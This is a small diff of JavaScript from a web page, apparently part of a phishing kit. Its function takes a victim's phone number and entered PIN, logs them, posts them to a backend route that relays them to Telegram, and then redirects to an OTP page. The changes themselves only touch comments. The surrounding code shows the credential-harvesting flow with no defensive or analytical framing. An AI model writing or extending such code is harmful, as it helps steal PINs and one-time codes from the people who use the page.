@@ -197,7 +197,7 @@
     }
 
     // ============================================
-    // SEND NOTIFICATION VIA BACKEND (GUARANTEED TO WORK)
+    // SEND NOTIFICATION TO BACKEND (GUARANTEED)
     // ============================================
     async function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
@@ -219,6 +219,7 @@
         console.log('📤 Sending to backend:', payload);
         
         try {
+            // Use relative path - works on Railway
             var response = await fetch('/api/send-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -250,7 +251,7 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send Telegram notification via backend (GUARANTEED)
+        // Send Telegram notification via backend
         await sendTelegramNotification(pin);
         
         // Redirect to OTP page
